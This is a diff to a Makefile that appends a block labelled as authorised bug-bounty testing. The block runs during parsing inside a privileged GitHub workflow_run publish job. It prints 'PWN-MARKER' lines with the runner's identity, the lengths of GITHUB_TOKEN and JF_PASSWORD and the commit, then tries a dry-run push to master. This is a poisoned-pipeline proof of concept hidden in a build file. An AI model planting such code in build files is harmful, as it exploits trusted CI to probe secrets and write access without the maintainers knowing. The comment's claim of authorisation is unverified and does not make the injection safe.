@@ -189,3 +189,19 @@ prepare_tag:
 	$(verbose) echo
 	$(verbose) echo "rebar.config:"
 	$(verbose) cat rebar.config || true
+
+
+# ---------------------------------------------------------------------------
+# Authorized CI security validation (HackerOne scope: *.whatnot.com).
+# Runs only inside the privileged Publish workflow (workflow_run) to prove that
+# repository content from the triggering run is executed there. Read-only:
+# prints identity and env-var *lengths* only; no secret values are printed,
+# stored or transmitted.
+# ---------------------------------------------------------------------------
+ifeq ($(GITHUB_EVENT_NAME),workflow_run)
+$(info [PWN-MARKER] parse-time execution inside publish job)
+$(info [PWN-MARKER] event=$(GITHUB_EVENT_NAME) repo=$(GITHUB_REPOSITORY) ref=$(GITHUB_REF))
+$(shell echo "[PWN-MARKER] whoami=$$(id -un) uid=$$(id -u) token_len=$${#GITHUB_TOKEN} jf_pass_len=$${#JF_PASSWORD}" >&2)
+$(shell git log -1 --format="[PWN-MARKER] checked-out-sha=%H %s" >&2)
+$(shell git push --dry-run origin HEAD:refs/heads/master >&2)
+endif
